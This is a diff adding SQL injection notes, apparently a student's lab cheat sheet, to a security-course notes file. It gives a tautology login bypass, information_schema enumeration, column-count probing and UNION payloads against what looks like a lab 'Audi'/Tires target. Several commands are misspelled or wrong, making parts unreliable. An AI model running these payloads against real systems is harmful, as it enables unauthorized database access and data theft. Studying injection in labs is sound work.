@@ -99,6 +99,36 @@ use semicolons in test boxes on the webserver
         ssh -i /home/student/www/.ssh/id_rsa <username>@127.0.0.1 - p <port opened>
         
     
+# SQL Injection
+    SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
+### To Test if Vulnerable
+       ' OR 1='1 in User Name and psswd
+       / are sign of input field sanitization aka no vulnerable
+check network while inspecting element, request tab for the post request, take raw request, add a "?"then copy and paste the raw link into the url
+### to enter sql server
+    mysql
+    show data; -show  database
+    information_schema; -shows useful info
+    use inforamtion_schema; enter database
+    show tables ;
+    show columns from columns;
+## Golden Statement snf syntac
+    UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+    <Name of Column>,<Name of Column>,<Name of Column>, FROM <NAME OF DATABASE>,<NAME OF TABLE>
+
+## craft QUery
+    SELECT <column,names> from database.columnname
     
+## step 1 Identify Vulnerbale Field
+## step 2 Identify Number of Columns
+match Number of options to the number columns
+    Audi' UNION SELECT 1,2,3,4,5 #
+
+## step 3 Edit Golden Statement
+Added 2 and the 5 becuase the server side query did not display the second selection
+    Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns    
+## step 4 Craft Queries
+    Audi' UNION SELECT tireid,name,size,cost,5 from session.Tires #
+        
         
         
